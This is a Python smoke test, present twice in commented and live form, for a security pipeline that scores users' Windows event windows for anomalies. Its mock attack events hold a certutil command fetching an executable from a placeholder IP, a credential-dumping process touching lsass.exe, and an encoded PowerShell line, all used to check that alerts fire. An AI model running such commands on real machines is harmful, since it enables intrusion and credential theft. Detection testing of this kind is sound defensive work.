# # End-to-end smoke test, no Kafka and no ClickHouse needed.
# #   1. fabricates a tiny baseline_output/ for user charlie.brown
# #   2. feeds one benign + one attack evening + one unbaselined-user window
# #   3. asserts: benign quiet, attack alerts with ranked reasons,
# #              ProcessGuid/5156 fallback attribution works,
# #              unbaselined user's events are held for ClickHouse (JSONL fallback)
# # Run:  python3 tests/test_pipeline.py

# from __future__ import annotations
# import json
# import os
# import pickle
# import shutil
# import sys
# import tempfile

# import numpy as np
# import pandas as pd

# sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
# from app.config import Config
# from app.consumer import Pipeline

# # ---------------------------------------------------------------- fixture baseline
# STAT = ["event_count", "proc_count", "proc_unique", "logon_ok_count", "net_conn_count"]
# ACTW = {"discovery_count": 1.2, "encoded_count": 2.0, "temp_proc_count": 1.5,
#         "lolbin_count": 1.2, "transfer_count": 1.0, "lsass_hi_count": 2.5,
#         "rthread_ext_count": 2.5, "ext_src_count": 2.0, "logon_fail_count": 0.0,
#         "svc_install_count": 2.5, "task_count": 2.0, "logclear_count": 3.0,
#         "script_ext_net_count": 1.5, "script_net_count": 0.8}


# def build_baseline(d: str):
#     os.makedirs(d, exist_ok=True)
#     idx = pd.MultiIndex.from_product([["charlie.brown"], range(24)], names=["user", "hour"])
#     zero = pd.DataFrame(0.0, index=idx, columns=STAT)
#     uidx = pd.Index(["charlie.brown"], name="user")
#     zero_u = pd.DataFrame(0.0, index=uidx, columns=STAT)
#     half_u = zero_u.copy() + 0.5      # mad_u: some dispersion (user-indexed, as the notebook)
#     num = {"med_h": zero, "mad_h": zero, "p95_h": zero, "med_u": zero_u,
#            "mad_u": half_u, "max_h": zero, "p05_h": zero, "p25_h": zero, "p75_h": zero}
#     # EXACT shape of the notebook's save cell (uppercase keys + weights dict +
#     # threshold_surface inside the pickle)
#     idx_s = pd.MultiIndex.from_product([["charlie.brown"], range(24)], names=["user", "hour"])
#     surface = pd.Series(0.73, index=idx_s, name="threshold")
#     cfg = {"local_tz": "UTC", "window": "10min", "train_dates": ["2026-07-28"],
#            "principals": ["charlie.brown"], "stat_features": STAT,
#            "act_features": list(ACTW), "act_weights": ACTW,
#            "Z0": 9.0, "Z1": 22.0, "K_STAT": 1.6, "K_NOV": 4.5, "K_RARE": 1.2, "K_ACT": 2.5,
#            "weights": {"s_stat": 0.55, "s_nov": 0.88, "s_rare": 0.90,
#                         "s_act": 0.80, "s_ml": 0.12},
#            "alert_threshold": 0.73, "risk_bands": [(0.25, "NORMAL"), (0.45, "LOW"),
#                                                     (0.60, "MEDIUM"), (0.80, "HIGH"),
#                                                     (1.01, "CRITICAL")]}
#     with open(os.path.join(d, "model.pkl"), "wb") as fh:
#         pickle.dump({"config": cfg, "numeric_baseline": num,
#                      "threshold_surface": surface, "isolation_forest": None}, fh)
#     surface.reset_index().to_parquet(os.path.join(d, "threshold_surface.parquet"), index=False)

#     known = pd.DataFrame([
#         ("charlie.brown", "process", "c:\\program files\\google\\chrome\\application\\chrome.exe"),
#         ("charlie.brown", "process", "c:\\windows\\explorer.exe"),
#         ("charlie.brown", "process", "c:\\windows\\system32\\cmd.exe"),
#         ("charlie.brown", "cmd_sig", "chrome.exe|"),
#         ("charlie.brown", "cmd_sig", "cmd.exe|/c"),
#         ("charlie.brown", "pair", "explorer.exe>chrome.exe"),
#         ("charlie.brown", "src_ip", "10.10.10.23"),
#         ("charlie.brown", "auth_path", "10.10.10.23>PC-003"),
#         ("charlie.brown", "logon_host_type", "PC-003/2"),
#         ("charlie.brown", "logon_type", "2"),
#         ("charlie.brown", "computer", "PC-003"),
#         ("charlie.brown", "dst_ip", "10.10.20.20"),
#         ("charlie.brown", "domain", "corp.local"),
#     ], columns=["user", "itype", "value"])
#     known["known"] = True
#     known.to_parquet(os.path.join(d, "baseline_inventories.parquet"), index=False)

#     pd.DataFrame([
#         ("process", "c:\\program files\\google\\chrome\\application\\chrome.exe", 200),
#         ("process", "c:\\windows\\explorer.exe", 500),
#         ("process", "c:\\windows\\system32\\cmd.exe", 120),
#         ("dst_ip", "10.10.20.20", 300), ("domain", "corp.local", 400),
#         ("computer", "pc-003", 900), ("src_ip", "10.10.10.23", 400),
#     ], columns=["itype", "gvalue", "gcnt"]).to_parquet(
#         os.path.join(d, "baseline_global_rarity.parquet"), index=False)

#     pd.DataFrame([("charlie.brown", 4624, 60), ("charlie.brown", 4634, 60),
#                   ("charlie.brown", 1, 300), ("charlie.brown", 22, 150),
#                   ("charlie.brown", 3, 150), ("charlie.brown", 4768, 40),
#                   ("charlie.brown", 4769, 200)],
#                  columns=["user", "EventID", "ucnt"]).to_parquet(
#         os.path.join(d, "baseline_eventid_rarity.parquet"), index=False)

#     pd.DataFrame([dict(user="charlie.brown", **{k: 0 for k in ACTW})]).set_index("user").to_parquet(
#         os.path.join(d, "baseline_activation.parquet"))


# # ---------------------------------------------------------------- mock events
# def E(ts, eid, **kw):
#     base = {"timestamp": ts, "EventID": eid,
#             "Channel": "Microsoft-Windows-Sysmon/Operational" if eid in (1, 3, 5, 7, 8, 10, 11, 22)
#                       else "Security",
#             "Computer": kw.pop("Computer", "PC-003.corp.local")}
#     base.update(kw)
#     return base


# def events():
#     ev = []
#     # ---- benign window, Aug 3 10:0x (baseline-consistent) ----
#     for i, t in enumerate(["10:01:10", "10:02:20", "10:04:40"]):
#         ev.append(E(f"2026-08-03T{t}Z", 1, User="CORP\\charlie.brown",
#                     Image="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
#                     ParentImage="C:\\Windows\\explorer.exe",
#                     ProcessGuid=f"{{AAA{i}}}", ProcessId=str(1000 + i)))
#     ev.append(E("2026-08-03T10:03:00Z", 4624, TargetUserName="charlie.brown",
#                 LogonType="2", IpAddress="10.10.10.23", WorkstationName="PC-003"))
#     # ---- attack evening, Aug 4 21:3x-21:4x ----
#     ev.append(E("2026-08-04T21:31:00Z", 4625, TargetUserName="charlie.brown", LogonType="10",
#                 IpAddress="203.0.113.117", SubStatus="0xc000006a"))
#     ev.append(E("2026-08-04T21:31:25Z", 4625, TargetUserName="charlie.brown", LogonType="10",
#                 IpAddress="203.0.113.117", SubStatus="0xc000006a"))
#     ev.append(E("2026-08-04T21:32:30Z", 4624, TargetUserName="charlie.brown", LogonType="10",
#                 IpAddress="203.0.113.117", WorkstationName="-"))
#     ev.append(E("2026-08-04T21:33:10Z", 1, User="CORP\\charlie.brown",
#                 Image="C:\\Windows\\System32\\whoami.exe", CommandLine="whoami /all",
#                 ParentImage="C:\\Windows\\explorer.exe", ProcessGuid="{B1}", ProcessId="46336"))
#     ev.append(E("2026-08-04T21:34:00Z", 1, User="CORP\\charlie.brown",
#                 Image="C:\\Windows\\System32\\certutil.exe",
#                 CommandLine="certutil -urlcache -split -f http://198.51.100.29/x.exe C:\\Windows\\Temp\\cs.exe",
#                 ParentImage="C:\\Windows\\explorer.exe", ProcessGuid="{B2}", ProcessId="46400"))
#     ev.append(E("2026-08-04T21:34:20Z", 1, User="CORP\\charlie.brown",
#                 Image="C:\\Windows\\Temp\\cs.exe", CommandLine="cs.exe --dump-creds",
#                 ParentImage="C:\\Windows\\explorer.exe", ProcessGuid="{B3}", ProcessId="46432"))
#     ev.append(E("2026-08-04T21:34:25Z", 8, SourceUser="CORP\\charlie.brown",
#                 SourceImage="C:\\Windows\\Temp\\cs.exe",
#                 TargetImage="C:\\Windows\\System32\\lsass.exe",
#                 SourceProcessGuid="{B3}", TargetProcessGuid="{LSASS}"))
#     ev.append(E("2026-08-04T21:34:40Z", 10, SourceUser="CORP\\charlie.brown",
#                 SourceImage="C:\\Windows\\Temp\\cs.exe",
#                 TargetImage="C:\\Windows\\System32\\lsass.exe", GrantedAccess="0x1010",
#                 SourceProcessGuid="{B3}", TargetProcessGuid="{LSASS}"))
#     ev.append(E("2026-08-04T21:35:10Z", 5156, Application="\\Device\\HarddiskVolume3\\Windows\\Temp\\cs.exe",
#                 ProcessID="46432", DestAddress="198.51.100.29", DestPort="443", Protocol="6"))
#     # ---- unbaselined user, same evening ----
#     ev.append(E("2026-08-04T21:36:00Z", 1, User="CORP\\diana.prince",
#                 Image="C:\\Program Files\\Postman\\Postman.exe", ProcessGuid="{D1}", ProcessId="900"))
#     return ev


# def main():
#     tmp = tempfile.mkdtemp()
#     bl_dir = os.path.join(tmp, "baseline_output")
#     build_baseline(bl_dir)

#     cfg = Config.load(os.path.join(os.path.dirname(__file__), "..", "config.yaml"))
#     cfg.raw["baseline"] = {"dir": bl_dir}
#     cfg.raw["clickhouse"] = {"mode": "unbaselined"}          # JSONL fallback active
#     pipe = Pipeline(cfg)

#     for raw in events():
#         pipe.feed(raw)
#     results = pipe.process_ready(flush=True)

#     print("\n================ RESULTS ================")
#     for r in results:
#         print(f"{r['user']:<15} {r['window_start']}  risk={r['risk_score']:<7} "
#               f"{r['risk_level']:<9} ratio={r['risk_ratio']} alert={r['alert']}")
#         for reason in r["reasons"][:3]:
#             print(f"     - [{reason['signal']:<11}] {reason['text'][:96]}")

#     # ---------------- assertions ----------------
#     by_key = {(r["user"], r["window_start"]): r for r in results}
#     attack = [r for r in results if r["window_start"].startswith("2026-08-04T21:30")
#               and r["user"] == "charlie.brown"]
#     benign = [r for r in results if r["window_start"].startswith("2026-08-03T10:00")]
#     assert attack, "attack window produced no result"
#     assert attack[0]["alert"], f"attack window did not alert: {attack[0]}"
#     assert attack[0]["threshold"] == 0.73, f"threshold surface not loaded: {attack[0]}"
#     assert attack[0]["risk_level"] in ("HIGH", "CRITICAL"), attack[0]["risk_level"]
#     assert any("whoami" in x["text"] or "first occurrence" in x["text"] for x in attack[0]["reasons"])
#     assert benign and not benign[0]["alert"], f"benign window should stay quiet: {benign}"
#     tiers = pipe.attributor.stats
#     assert tiers["B2_5156_lifetime"] >= 1, f"5156 lifetime fallback not exercised: {tiers}"
#     assert pipe.counters["events_held_clickhouse"] >= 1, "unbaselined user not held for ClickHouse"
#     fb = "./clickhouse_fallback/events.jsonl"
#     assert os.path.exists(fb) and "diana.prince" in open(fb).read()

#     # ============================================================
#     # REQUIREMENT 5b: unbaselined user's FEATURES are stored (not just events)
#     # ============================================================
#     ffp = "./clickhouse_fallback/window_features.jsonl"
#     assert os.path.exists(ffp), "features were not stored for the unbaselined user"
#     stored = open(ffp).read()
#     assert "diana.prince" in stored, "diana's window features missing from the store"

#     # ============================================================
#     # REQUIREMENT 6: 7 days of stored data -> baseline auto-built -> user scores
#     # ============================================================
#     # trainer was constructed with config defaults; tighten thresholds directly
#     pipe.trainer.min_days = 7
#     pipe.trainer.min_events = 10
#     import pandas as pd
#     feats0 = {k: 0.0 for k in ACTW}
#     benign = {"event_count": 3, "proc_count": 1, "proc_unique": 1, "parent_unique": 1,
#               "pair_unique": 1, "logon_ok_count": 1, "net_conn_count": 0, **feats0,
#               "eid_counts": {"1": 1, "4624": 1}}
#     days = ["2026-07-28", "2026-07-29", "2026-07-30", "2026-07-31",
#             "2026-08-01", "2026-08-02", "2026-08-03"]
#     for d in days:
#         for mm in ("00", "10"):
#             win = pd.Timestamp(f"{d}T10:{mm}:00Z")
#             pipe.ch.insert_features("new.user", win, benign, pd.DataFrame([
#                 {"itype": "process", "value": "c:\\windows\\system32\\cmd.exe",
#                  "gvalue": "c:\\windows\\system32\\cmd.exe", "trusted": False,
#                  "is_public": False, "susp_dir": False, "sens_port": False, "interactive": False}]))

#     rep = pipe.trainer.train_ready_users()
#     print("\ntrainer report:", rep["trained"], "| candidates:", rep["candidates"])
#     assert "new.user" in rep["trained"], f"trainer did not build new.user: {rep}"
#     assert pipe.store.has_baseline("new.user"), "hot-reload did not pick up new.user"

#     # now a NEW window for new.user must be SCORED against the fresh baseline
#     attack = [
#         E("2026-08-05T10:01:00Z", 1, User="CORP\\new.user",
#           Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
#           CommandLine="powershell.exe -NoProfile -EncodedCommand QwBvAG0AcAByAGUAcwBzAA==",
#           ParentImage="C:\\Windows\\explorer.exe", ProcessGuid="{N1}", ProcessId="700"),
#         E("2026-08-05T10:02:00Z", 1, User="CORP\\new.user",
#           Image="C:\\Windows\\System32\\whoami.exe", CommandLine="whoami /all",
#           ParentImage="C:\\Windows\\explorer.exe", ProcessGuid="{N2}", ProcessId="701"),
#     ]
#     for raw in attack:
#         pipe.feed(raw)
#     res2 = pipe.process_ready(flush=True)
#     nu = [r for r in res2 if r["user"] == "new.user"]
#     assert nu, "new.user window was not scored after auto-baseline"
#     print(f"new.user scored: risk={nu[0]['risk_score']} {nu[0]['risk_level']} "
#           f"alert={nu[0]['alert']} (baseline auto-built from ClickHouse-held data)")

#     print("\nALL ASSERTIONS PASSED")
#     print("attribution tiers:", tiers)
#     print("counters:", dict(pipe.counters))
#     shutil.rmtree(tmp, ignore_errors=True)


# if __name__ == "__main__":
#     main()
# End-to-end smoke test, no Kafka and no ClickHouse needed.
#   1. fabricates a tiny baseline_output/ for user charlie.brown
#   2. feeds one benign + one attack evening + one unbaselined-user window
#   3. asserts: benign quiet, attack alerts with ranked reasons,
#              ProcessGuid/5156 fallback attribution works,
#              unbaselined user's events are held for ClickHouse (JSONL fallback)
# Run:  python3 tests/test_pipeline.py

from __future__ import annotations
import json
import os
import pickle
import shutil
import sys
import tempfile

import numpy as np
import pandas as pd

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from app.config import Config
from app.consumer import Pipeline

# ---------------------------------------------------------------- fixture baseline
STAT = ["event_count", "proc_count", "proc_unique", "logon_ok_count", "net_conn_count"]
ACTW = {"discovery_count": 1.2, "encoded_count": 2.0, "temp_proc_count": 1.5,
        "lolbin_count": 1.2, "transfer_count": 1.0, "lsass_hi_count": 2.5,
        "rthread_ext_count": 2.5, "ext_src_count": 2.0, "logon_fail_count": 0.0,
        "svc_install_count": 2.5, "task_count": 2.0, "logclear_count": 3.0,
        "script_ext_net_count": 1.5, "script_net_count": 0.8}


def build_baseline(d: str):
    os.makedirs(d, exist_ok=True)
    idx = pd.MultiIndex.from_product([["charlie.brown"], range(24)], names=["user", "hour"])
    zero = pd.DataFrame(0.0, index=idx, columns=STAT)
    uidx = pd.Index(["charlie.brown"], name="user")
    zero_u = pd.DataFrame(0.0, index=uidx, columns=STAT)
    half_u = zero_u.copy() + 0.5      # mad_u: some dispersion (user-indexed, as the notebook)
    num = {"med_h": zero, "mad_h": zero, "p95_h": zero, "med_u": zero_u,
           "mad_u": half_u, "max_h": zero, "p05_h": zero, "p25_h": zero, "p75_h": zero}
    # EXACT shape of the notebook's save cell (uppercase keys + weights dict +
    # threshold_surface inside the pickle)
    idx_s = pd.MultiIndex.from_product([["charlie.brown"], range(24)], names=["user", "hour"])
    surface = pd.Series(0.73, index=idx_s, name="threshold")
    cfg = {"local_tz": "UTC", "window": "10min", "train_dates": ["2026-07-28"],
           "principals": ["charlie.brown"], "stat_features": STAT,
           "act_features": list(ACTW), "act_weights": ACTW,
           "Z0": 9.0, "Z1": 22.0, "K_STAT": 1.6, "K_NOV": 4.5, "K_RARE": 1.2, "K_ACT": 2.5,
           "weights": {"s_stat": 0.55, "s_nov": 0.88, "s_rare": 0.90,
                        "s_act": 0.80, "s_ml": 0.12},
           "alert_threshold": 0.73, "risk_bands": [(0.25, "NORMAL"), (0.45, "LOW"),
                                                    (0.60, "MEDIUM"), (0.80, "HIGH"),
                                                    (1.01, "CRITICAL")]}
    with open(os.path.join(d, "model.pkl"), "wb") as fh:
        pickle.dump({"config": cfg, "numeric_baseline": num,
                     "threshold_surface": surface, "isolation_forest": None}, fh)
    surface.reset_index().to_parquet(os.path.join(d, "threshold_surface.parquet"), index=False)

    known = pd.DataFrame([
        ("charlie.brown", "process", "c:\\program files\\google\\chrome\\application\\chrome.exe"),
        ("charlie.brown", "process", "c:\\windows\\explorer.exe"),
        ("charlie.brown", "process", "c:\\windows\\system32\\cmd.exe"),
        ("charlie.brown", "cmd_sig", "chrome.exe|"),
        ("charlie.brown", "cmd_sig", "cmd.exe|/c"),
        ("charlie.brown", "pair", "explorer.exe>chrome.exe"),
        ("charlie.brown", "src_ip", "10.10.10.23"),
        ("charlie.brown", "auth_path", "10.10.10.23>PC-003"),
        ("charlie.brown", "logon_host_type", "PC-003/2"),
        ("charlie.brown", "logon_type", "2"),
        ("charlie.brown", "computer", "PC-003"),
        ("charlie.brown", "dst_ip", "10.10.20.20"),
        ("charlie.brown", "domain", "corp.local"),
    ], columns=["user", "itype", "value"])
    known["known"] = True
    known.to_parquet(os.path.join(d, "baseline_inventories.parquet"), index=False)

    pd.DataFrame([
        ("process", "c:\\program files\\google\\chrome\\application\\chrome.exe", 200),
        ("process", "c:\\windows\\explorer.exe", 500),
        ("process", "c:\\windows\\system32\\cmd.exe", 120),
        ("dst_ip", "10.10.20.20", 300), ("domain", "corp.local", 400),
        ("computer", "pc-003", 900), ("src_ip", "10.10.10.23", 400),
    ], columns=["itype", "gvalue", "gcnt"]).to_parquet(
        os.path.join(d, "baseline_global_rarity.parquet"), index=False)

    pd.DataFrame([("charlie.brown", 4624, 60), ("charlie.brown", 4634, 60),
                  ("charlie.brown", 1, 300), ("charlie.brown", 22, 150),
                  ("charlie.brown", 3, 150), ("charlie.brown", 4768, 40),
                  ("charlie.brown", 4769, 200)],
                 columns=["user", "EventID", "ucnt"]).to_parquet(
        os.path.join(d, "baseline_eventid_rarity.parquet"), index=False)

    pd.DataFrame([dict(user="charlie.brown", **{k: 0 for k in ACTW})]).set_index("user").to_parquet(
        os.path.join(d, "baseline_activation.parquet"))


# ---------------------------------------------------------------- mock events
def E(ts, eid, **kw):
    base = {"timestamp": ts, "EventID": eid,
            "Channel": "Microsoft-Windows-Sysmon/Operational" if eid in (1, 3, 5, 7, 8, 10, 11, 22)
                      else "Security",
            "Computer": kw.pop("Computer", "PC-003.corp.local")}
    base.update(kw)
    return base


def events():
    ev = []
    # ---- benign window, Aug 3 10:0x (baseline-consistent) ----
    for i, t in enumerate(["10:01:10", "10:02:20", "10:04:40"]):
        ev.append(E(f"2026-08-03T{t}Z", 1, User="CORP\\charlie.brown",
                    Image="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                    ParentImage="C:\\Windows\\explorer.exe",
                    ProcessGuid=f"{{AAA{i}}}", ProcessId=str(1000 + i)))
    ev.append(E("2026-08-03T10:03:00Z", 4624, TargetUserName="charlie.brown",
                LogonType="2", IpAddress="10.10.10.23", WorkstationName="PC-003"))
    # ---- attack evening, Aug 4 21:3x-21:4x ----
    ev.append(E("2026-08-04T21:31:00Z", 4625, TargetUserName="charlie.brown", LogonType="10",
                IpAddress="203.0.113.117", SubStatus="0xc000006a"))
    ev.append(E("2026-08-04T21:31:25Z", 4625, TargetUserName="charlie.brown", LogonType="10",
                IpAddress="203.0.113.117", SubStatus="0xc000006a"))
    ev.append(E("2026-08-04T21:32:30Z", 4624, TargetUserName="charlie.brown", LogonType="10",
                IpAddress="203.0.113.117", WorkstationName="-"))
    ev.append(E("2026-08-04T21:33:10Z", 1, User="CORP\\charlie.brown",
                Image="C:\\Windows\\System32\\whoami.exe", CommandLine="whoami /all",
                ParentImage="C:\\Windows\\explorer.exe", ProcessGuid="{B1}", ProcessId="46336"))
    ev.append(E("2026-08-04T21:34:00Z", 1, User="CORP\\charlie.brown",
                Image="C:\\Windows\\System32\\certutil.exe",
                CommandLine="certutil -urlcache -split -f http://198.51.100.29/x.exe C:\\Windows\\Temp\\cs.exe",
                ParentImage="C:\\Windows\\explorer.exe", ProcessGuid="{B2}", ProcessId="46400"))
    ev.append(E("2026-08-04T21:34:20Z", 1, User="CORP\\charlie.brown",
                Image="C:\\Windows\\Temp\\cs.exe", CommandLine="cs.exe --dump-creds",
                ParentImage="C:\\Windows\\explorer.exe", ProcessGuid="{B3}", ProcessId="46432"))
    ev.append(E("2026-08-04T21:34:25Z", 8, SourceUser="CORP\\charlie.brown",
                SourceImage="C:\\Windows\\Temp\\cs.exe",
                TargetImage="C:\\Windows\\System32\\lsass.exe",
                SourceProcessGuid="{B3}", TargetProcessGuid="{LSASS}"))
    ev.append(E("2026-08-04T21:34:40Z", 10, SourceUser="CORP\\charlie.brown",
                SourceImage="C:\\Windows\\Temp\\cs.exe",
                TargetImage="C:\\Windows\\System32\\lsass.exe", GrantedAccess="0x1010",
                SourceProcessGuid="{B3}", TargetProcessGuid="{LSASS}"))
    ev.append(E("2026-08-04T21:35:10Z", 5156, Application="\\Device\\HarddiskVolume3\\Windows\\Temp\\cs.exe",
                ProcessID="46432", DestAddress="198.51.100.29", DestPort="443", Protocol="6"))
    # ---- unbaselined user, same evening ----
    ev.append(E("2026-08-04T21:36:00Z", 1, User="CORP\\diana.prince",
                Image="C:\\Program Files\\Postman\\Postman.exe", ProcessGuid="{D1}", ProcessId="900"))
    return ev


def main():
    tmp = tempfile.mkdtemp()
    bl_dir = os.path.join(tmp, "baseline_output")
    build_baseline(bl_dir)

    cfg = Config.load(os.path.join(os.path.dirname(__file__), "..", "config.yaml"))
    cfg.raw["baseline"] = {"dir": bl_dir}
    cfg.raw["clickhouse"] = {"mode": "unbaselined"}          # JSONL fallback active
    pipe = Pipeline(cfg)

    for raw in events():
        pipe.feed(raw)
    results = pipe.process_ready(flush=True)

    print("\n================ RESULTS ================")
    for r in results:
        print(f"{r['user']:<15} {r['window_start']}  risk={r['risk_score']:<7} "
              f"{r['risk_level']:<9} ratio={r['risk_ratio']} alert={r['alert']}")
        for reason in r["reasons"][:3]:
            print(f"     - [{reason['signal']:<11}] {reason['text'][:96]}")

    # ---------------- assertions ----------------
    by_key = {(r["user"], r["window_start"]): r for r in results}
    attack = [r for r in results if r["window_start"].startswith("2026-08-04T21:30")
              and r["user"] == "charlie.brown"]
    benign = [r for r in results if r["window_start"].startswith("2026-08-03T10:00")]
    assert attack, "attack window produced no result"
    assert attack[0]["alert"], f"attack window did not alert: {attack[0]}"
    assert attack[0]["threshold"] == 0.73, f"threshold surface not loaded: {attack[0]}"
    assert attack[0]["risk_level"] in ("HIGH", "CRITICAL"), attack[0]["risk_level"]
    assert any("whoami" in x["text"] or "first occurrence" in x["text"] for x in attack[0]["reasons"])
    assert benign and not benign[0]["alert"], f"benign window should stay quiet: {benign}"
    tiers = pipe.attributor.stats
    assert tiers["B2_5156_lifetime"] >= 1, f"5156 lifetime fallback not exercised: {tiers}"
    assert pipe.counters["events_held_clickhouse"] >= 1, "unbaselined user not held for ClickHouse"
    fb = "./clickhouse_fallback/events.jsonl"
    assert os.path.exists(fb) and "diana.prince" in open(fb).read()

    # ============================================================
    # REQUIREMENT 5b: unbaselined user's FEATURES are stored (not just events)
    # ============================================================
    ffp = "./clickhouse_fallback/window_features.jsonl"
    assert os.path.exists(ffp), "features were not stored for the unbaselined user"
    stored = open(ffp).read()
    assert "diana.prince" in stored, "diana's window features missing from the store"

    # ============================================================
    # REQUIREMENT 6: 7 days of stored data -> baseline auto-built -> user scores
    # ============================================================
    # trainer was constructed with config defaults; tighten thresholds directly
    pipe.trainer.min_days = 7
    pipe.trainer.min_events = 10
    import pandas as pd
    feats0 = {k: 0.0 for k in ACTW}
    benign = {"event_count": 3, "proc_count": 1, "proc_unique": 1, "parent_unique": 1,
              "pair_unique": 1, "logon_ok_count": 1, "net_conn_count": 0, **feats0,
              "eid_counts": {"1": 1, "4624": 1}}
    days = ["2026-07-28", "2026-07-29", "2026-07-30", "2026-07-31",
            "2026-08-01", "2026-08-02", "2026-08-03"]
    for d in days:
        for mm in ("00", "10"):
            win = pd.Timestamp(f"{d}T10:{mm}:00Z")
            pipe.ch.insert_features("ravi.kumar", win, benign, pd.DataFrame([
                {"itype": "process", "value": "c:\\windows\\system32\\cmd.exe",
                 "gvalue": "c:\\windows\\system32\\cmd.exe", "trusted": False,
                 "is_public": False, "susp_dir": False, "sens_port": False, "interactive": False}]))

    rep = pipe.trainer.train_ready_users()
    print("\ntrainer report:", rep["trained"], "| candidates:", rep["candidates"])
    assert "ravi.kumar" in rep["trained"], f"trainer did not build new.user: {rep}"
    assert pipe.store.has_baseline("ravi.kumar"), "hot-reload did not pick up new.user"

    # now a NEW window for new.user must be SCORED against the fresh baseline
    attack = [
        E("2026-08-05T10:01:00Z", 1, User="CORP\\ravi.kumar",
          Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          CommandLine="powershell.exe -NoProfile -EncodedCommand QwBvAG0AcAByAGUAcwBzAA==",
          ParentImage="C:\\Windows\\explorer.exe", ProcessGuid="{N1}", ProcessId="700"),
        E("2026-08-05T10:02:00Z", 1, User="CORP\\ravi.kumar",
          Image="C:\\Windows\\System32\\whoami.exe", CommandLine="whoami /all",
          ParentImage="C:\\Windows\\explorer.exe", ProcessGuid="{N2}", ProcessId="701"),
    ]
    for raw in attack:
        pipe.feed(raw)
    res2 = pipe.process_ready(flush=True)
    nu = [r for r in res2 if r["user"] == "ravi.kumar"]
    assert nu, "ravi.kumar window was not scored after auto-baseline"
    print(f"new.user scored: risk={nu[0]['risk_score']} {nu[0]['risk_level']} "
          f"alert={nu[0]['alert']} (baseline auto-built from ClickHouse-held data)")

    print("\nALL ASSERTIONS PASSED")
    print("attribution tiers:", tiers)
    print("counters:", dict(pipe.counters))
    shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    main()
